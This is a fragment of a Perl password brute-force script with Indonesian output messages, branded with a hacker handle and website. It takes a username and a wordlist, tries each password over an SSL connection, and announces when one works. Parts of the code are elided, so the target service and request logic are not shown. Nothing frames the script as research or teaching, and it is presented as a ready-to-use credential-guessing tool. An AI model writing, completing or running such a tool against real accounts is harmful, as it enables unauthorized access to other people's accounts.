...
print "+++ Powered by Mr.T959\n";
print "+++ www.mr-t959.xyz\n\n";
print "+++ Cara Menggunakan: perl $0 login wordlist\n\n";
exit; }

my $user = $ARGV[0];
my $wordlist = $ARGV[1];

open (LIST, $wordlist) || die "\n[-] Tidak Ada wordlist di $wordlist -_- \n";
...
print "[$datestring][-] $password -> Salah :( \n";
close SSL;
}
else
{
print "\n########################################################\n";
print "[+] Yes!! passwordnya adalah => $password :D\n";
print "########################################################\n\n";
close SSL;
exit;
}
